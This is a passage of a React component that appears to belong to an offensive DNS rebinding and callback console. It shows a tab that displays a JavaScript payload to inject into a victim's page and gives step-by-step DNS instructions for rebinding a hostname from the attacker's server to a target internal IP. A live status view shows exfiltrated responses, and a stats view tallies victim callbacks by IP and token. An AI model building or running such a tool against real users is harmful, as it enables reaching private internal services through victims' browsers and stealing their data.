                          <span className="text-zinc-600 uppercase text-[9px] tracking-wider">Callback URL</span>
                          <button onClick={() => copy(rebindCbUrl, "rbcb")} className="text-zinc-600 hover:text-zinc-300 text-[8px]">
                            {copied === "rbcb" ? "copied!" : "copy"}
                          </button>
                        </div>
                        <div className="font-mono text-cyan-400 break-all">{rebindCbUrl}</div>
                      </div>
                    )}
                  </div>
                </div>
              )}

              {/* PAYLOADS */}
              {rebindTab === "payload" && (
                <div className="space-y-4 max-w-3xl">
                  {!rebindPayload ? (
                    <div className="text-zinc-600 text-[10px]">
                      Complete the Setup tab first to generate the attack payload.
                    </div>
                  ) : (
                    <>
                      <div>
                        <div className="flex items-center justify-between mb-1">
                          <span className="text-[9px] text-zinc-500 uppercase tracking-wider">Core JS Payload</span>
                          <button onClick={() => copy(rebindPayload, "rbpayload")} className="text-[8px] text-zinc-600 hover:text-zinc-300">
                            {copied === "rbpayload" ? "copied!" : "copy"}
                          </button>
                        </div>
                        <pre className="bg-zinc-950 border border-zinc-800 rounded p-3 text-[10px] text-emerald-300 overflow-x-auto max-h-48 whitespace-pre-wrap break-all">
                          {rebindPayload}
                        </pre>
                        <div className="text-[9px] text-zinc-600 mt-1">
                          Inject this JS snippet into the victim page via any of the vectors below.
                          The rebind hostname <span className="text-cyan-400 font-mono">{rebindHost}</span> must point to your
                          server at load time and be rebound to{" "}
                          <span className="text-red-400 font-mono">INTERNAL_IP:{rebindPort}</span> after ~2.5s.
                        </div>
                      </div>

                      <div className="space-y-3">
                        {Object.entries(rebindCmds).map(([key, cmd]) => (
                          <div key={key}>
                            <div className="flex items-center justify-between mb-1">
                              <span className="text-[9px] text-purple-400 uppercase tracking-wider">{key.replace(/_/g, " ")}</span>
                              <button onClick={() => copy(cmd, key)} className="text-[8px] text-zinc-600 hover:text-zinc-300">
                                {copied === key ? "copied!" : "copy"}
                              </button>
                            </div>
                            <pre className="bg-zinc-950 border border-zinc-800/50 rounded p-2 text-[10px] text-zinc-300 overflow-x-auto max-h-28 whitespace-pre-wrap break-all">
                              {cmd}
                            </pre>
                          </div>
                        ))}
                      </div>

                      <div className="bg-zinc-900/40 border border-zinc-800/50 rounded p-3">
                        <div className="text-[9px] text-zinc-500 uppercase tracking-wider mb-2">DNS Setup Required</div>
                        <div className="text-[10px] text-zinc-400 space-y-1 leading-relaxed">
                          <div>1. Create A record: <span className="font-mono text-cyan-400">{rebindHost || "rebind.yourdomain.com"} → YOUR_SERVER_IP</span> with TTL=1</div>
                          <div>2. After victim loads page (watch for arm beacon), update A record:</div>
                          <div className="ml-4 font-mono text-red-400">{rebindHost || "rebind.yourdomain.com"} → TARGET_INTERNAL_IP</div>
                          <div>3. The victim JS automatically re-fetches after 2.5s using the rebound DNS.</div>
                          <div>4. Exfiltrated response appears in Live Status tab.</div>
                        </div>
                      </div>
                    </>
                  )}
                </div>
              )}

              {/* LIVE STATUS */}
              {rebindTab === "live" && (
                <div className="space-y-4 max-w-2xl">
                  {!rebindStatus ? (
                    <div className="text-zinc-600 text-[10px]">
                      Generate a token and arm the attack from the Setup tab.
                    </div>
                  ) : (
                    <>
                      <div className="bg-zinc-900/40 border border-zinc-800/50 rounded p-3 space-y-2">
                        <div className="flex items-center justify-between">
                          <span className="text-[9px] text-zinc-600 uppercase tracking-wider">Attack Status</span>
                          <span className={`text-[10px] font-bold ${PHASE_COLOR[rebindStatus.phase]}`}>
                            {PHASE_LABELS[rebindStatus.phase]}
                          </span>
                        </div>

                        <div className="grid grid-cols-2 gap-2 text-[10px]">
                          <div>
                            <span className="text-zinc-600">Token: </span>
                            <span className="font-mono text-amber-400">{rebindStatus.token.slice(0, 16)}</span>
                          </div>
                          <div>
                            <span className="text-zinc-600">Target: </span>
                            <span className="font-mono text-cyan-400">{rebindStatus.rebindHost}:{rebindStatus.targetPort}{rebindStatus.targetPath}</span>
                          </div>
                          {rebindStatus.armTs && (
                            <div>
                              <span className="text-zinc-600">Victim hit: </span>
                              <span className="text-emerald-400">{timeAgo(rebindStatus.armTs)}</span>
                            </div>
                          )}
                          {rebindStatus.exfilTs && (
                            <div>
                              <span className="text-zinc-600">Exfil at: </span>
                              <span className="text-emerald-400">{timeAgo(rebindStatus.exfilTs)}</span>
                            </div>
                          )}
                        </div>

                        {/* Phase progress indicator */}
                        <div className="flex items-center gap-1 mt-2">
                          {(["armed", "arm_hit", "rebind_wait", "exfil"] as RebindPhase[]).map((p, i) => {
                            const phases: RebindPhase[] = ["armed", "arm_hit", "rebind_wait", "exfil"];
                            const currentIdx = phases.indexOf(rebindStatus.phase);
                            const done = currentIdx > i;
                            const active = currentIdx === i;
                            return (
                              <React.Fragment key={p}>
                                <div className={`flex-1 h-1 rounded transition-colors ${done ? "bg-emerald-600" : active ? "bg-yellow-500 animate-pulse" : "bg-zinc-800"}`} />
                                {i < 3 && <div className="w-px h-2 bg-zinc-700" />}
                              </React.Fragment>
                            );
                          })}
                        </div>
                        <div className="flex justify-between text-[8px] text-zinc-700">
                          <span>ARMED</span><span>ARM HIT</span><span>REBINDING</span><span>EXFIL</span>
                        </div>
                      </div>

                      {rebindStatus.responseBody && (
                        <div>
                          <div className="flex items-center justify-between mb-1">
                            <span className="text-[9px] text-emerald-500 uppercase tracking-wider font-bold">EXFILTRATED RESPONSE</span>
                            <button onClick={() => copy(rebindStatus.responseBody!, "rb_exfil")}
                              className="text-[8px] text-zinc-600 hover:text-zinc-300">
                              {copied === "rb_exfil" ? "copied!" : "copy"}
                            </button>
                          </div>
                          <pre className="bg-zinc-950 border border-emerald-900/50 rounded p-3 text-[10px] text-emerald-300 overflow-x-auto max-h-64 whitespace-pre-wrap break-all">
                            {rebindStatus.responseBody}
                          </pre>
                        </div>
                      )}

                      {rebindStatus.errorMsg && (
                        <div>
                          <div className="text-[9px] text-red-500 uppercase tracking-wider mb-1">ERROR / CORS BLOCK</div>
                          <pre className="bg-zinc-950 border border-red-900/50 rounded p-2 text-[10px] text-red-300 whitespace-pre-wrap break-all">
                            {rebindStatus.errorMsg}
                          </pre>
                          <div className="text-[9px] text-zinc-600 mt-1">
                            CORS error usually means the rebind hasn&apos;t propagated yet or the target sends strict CORS headers.
                            Verify DNS TTL is low and the rebind hostname changed before the 2.5s JS timer fired.
                          </div>
                        </div>
                      )}

                      {/* Recent hits for this token */}
                      <div>
                        <div className="text-[9px] text-zinc-600 uppercase tracking-wider mb-2">OOB HITS FOR THIS TOKEN</div>
                        {hits.filter(h => h.token === rebindStatus.token).length === 0 ? (
                          <div className="text-zinc-700 text-[10px]">No callbacks yet — waiting…</div>
                        ) : (
                          <div className="divide-y divide-zinc-900 border border-zinc-800/50 rounded overflow-hidden">
                            {hits.filter(h => h.token === rebindStatus.token).map(h => (
                              <div key={h.id} className="flex items-center gap-2 px-3 py-2">
                                <span className="text-cyan-500 text-[10px] font-mono min-w-[80px]">
                                  {(h.query["phase"] ?? "callback") as string}
                                </span>
                                <span className="text-zinc-600 text-[9px]">{h.sourceIp}</span>
                                <span className="text-zinc-500 text-[9px] ml-auto">{timeAgo(h.ts)}</span>
                              </div>
                            ))}
                          </div>
                        )}
                      </div>
                    </>
                  )}
                </div>
              )}
            </div>
          </div>
        )}

        {/* STATS */}
        {tab === "stats" && (
          <div className="p-4 space-y-4">
            <div className="grid grid-cols-2 gap-3">
              <div className="bg-zinc-900/40 border border-zinc-800/50 rounded p-3">
                <div className="text-[9px] text-zinc-600 uppercase tracking-wider mb-2">HIT RATE OVER TIME</div>
                <div className="space-y-1">
                  {[60_000, 300_000, 3_600_000].map(window => {
                    const now   = Date.now();
                    const count = hits.filter(h => now - h.ts < window).length;
                    const label = window === 60_000 ? "last 1m" : window === 300_000 ? "last 5m" : "last 1h";
                    return (
                      <div key={window} className="flex items-center justify-between">
                        <span className="text-zinc-600 text-[10px]">{label}</span>
                        <span className="text-red-400 font-bold">{count}</span>
                      </div>
                    );
                  })}
                </div>
              </div>

              <div className="bg-zinc-900/40 border border-zinc-800/50 rounded p-3">
                <div className="text-[9px] text-zinc-600 uppercase tracking-wider mb-2">TOP SOURCE IPs</div>
                <div className="space-y-1">
                  {Object.entries(
                    hits.reduce<Record<string, number>>((acc, h) => {
                      acc[h.sourceIp] = (acc[h.sourceIp] ?? 0) + 1; return acc;
                    }, {}),
                  ).sort((a, b) => b[1] - a[1]).slice(0, 5).map(([ip, cnt]) => (
                    <div key={ip} className="flex items-center justify-between">
                      <span className="text-cyan-600 text-[10px] font-mono">{ip}</span>
                      <span className="text-zinc-400">{cnt}</span>
                    </div>
                  ))}
                  {stats.uniqueIps === 0 && <span className="text-zinc-700 text-[10px]">no data yet</span>}
                </div>
              </div>
            </div>

            <div className="bg-zinc-900/40 border border-zinc-800/50 rounded p-3">
              <div className="text-[9px] text-zinc-600 uppercase tracking-wider mb-2">TOKENS</div>
              <div className="space-y-1.5 max-h-56 overflow-y-auto">
                {Object.entries(
                  hits.reduce<Record<string, number>>((acc, h) => {
                    acc[h.token] = (acc[h.token] ?? 0) + 1; return acc;
                  }, {}),
                ).sort((a, b) => b[1] - a[1]).map(([tok, cnt]) => (
                  <div key={tok} className="flex items-center gap-2">
                    <span className="text-amber-600 font-mono text-[9px] bg-amber-950/30 px-1.5 py-0.5 rounded">{tok.slice(0, 16)}</span>
                    <div className="flex-1 h-1 bg-zinc-800 rounded overflow-hidden">
                      <div className="h-full bg-red-700 rounded" style={{ width: `${Math.min(100, (cnt / hits.length) * 100)}%` }} />
                    </div>
                    <span className="text-zinc-500 text-[9px] w-6 text-right">{cnt}</span>
                  </div>
                ))}
                {stats.total === 0 && <span className="text-zinc-700 text-[10px]">no callbacks yet</span>}
              </div>
            </div>

            <div className="bg-zinc-900/40 border border-zinc-800/50 rounded p-3">
              <div className="text-[9px] text-zinc-600 uppercase tracking-wider mb-2">METHOD BREAKDOWN</div>
              <div className="flex gap-4">
                {Object.entries(
                  hits.reduce<Record<string, number>>((acc, h) => {
                    acc[h.method] = (acc[h.method] ?? 0) + 1; return acc;
                  }, {}),
                ).sort((a, b) => b[1] - a[1]).map(([method, cnt]) => (
                  <div key={method} className="flex flex-col items-center gap-1">
                    <span className={`text-[9px] font-bold px-1.5 py-0.5 rounded ${methodBadge(method)}`}>{method}</span>
                    <span className="text-zinc-400 text-sm font-bold">{cnt}</span>
                  </div>
                ))}
                {stats.total === 0 && <span className="text-zinc-700 text-[10px]">no data yet</span>}
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
